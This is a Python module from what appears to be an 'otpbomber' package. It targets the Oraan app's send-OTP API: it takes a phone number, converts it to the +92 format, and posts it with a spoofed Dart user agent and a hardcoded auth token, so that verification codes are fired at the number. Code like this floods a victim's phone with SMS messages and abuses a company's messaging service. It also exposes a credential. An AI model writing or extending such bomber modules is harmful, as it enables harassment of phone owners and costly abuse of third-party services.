from otpbomber.core import *
from otpbomber.localuseragent import *

async def oraan(phone, client, out):
    name = "oraan"
    domain = "oraan"
    frequent_rate_limit=False

    auth_token = "0147C481BF6D516739336659C7CE1FDA528FEFE691DF130C0D4731EFCA06B14DE10B3166BCF76E8BC07AA08C0A344E2924DBC282387949D72B7DB773DD7BF4A7"
    headers = {
            "user-agent": "Dart/2.19 (dart:io)",
            "auth_token": auth_token,
            "accept-encoding": "gzip",
    }
    data = {
        "phone": f"+92{phone[-10:]}",  # Convert to +92 format for this API
        "whatsapp": "false"
    }
    r = await client.post("https://baseapi.oraan.com/api/users/send-otp", headers=headers, data=data)
    try:
        data=r.json()
        if data["message"] == "OTP sent successfully":
            out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": False,"sent": True, "error": False})
            return None
    except Exception:
        out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit,  "rateLimit": False, "sent": False, "error": True})
        return None